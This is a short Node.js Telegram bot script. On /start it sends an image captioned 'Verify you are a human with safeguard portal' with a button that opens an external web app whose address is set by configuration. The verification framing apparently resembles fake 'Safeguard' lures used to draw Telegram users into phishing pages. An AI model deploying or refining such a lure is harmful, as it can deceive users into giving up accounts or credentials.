require('dotenv').config(); // Load environment variables
const { Telegraf } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN); // Use the bot token from .env

bot.command('start', (ctx) => {
  // Send the image with a caption using the direct URL
  ctx.replyWithPhoto(
    { url: 'https://i.postimg.cc/gcswRwd2/photo-2025-01-20-16-14-02.jpg' }, // Replace with your direct link
    {
      caption: 'Verify you are a human with safeguard portal', // Caption text
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Verify',
              web_app: { url: process.env.WEB_APP_URL }, // Use the web app URL from .env
            },
          ],
        ],
      },
    }
  );
});

bot.launch();
console.log('Bot is running...');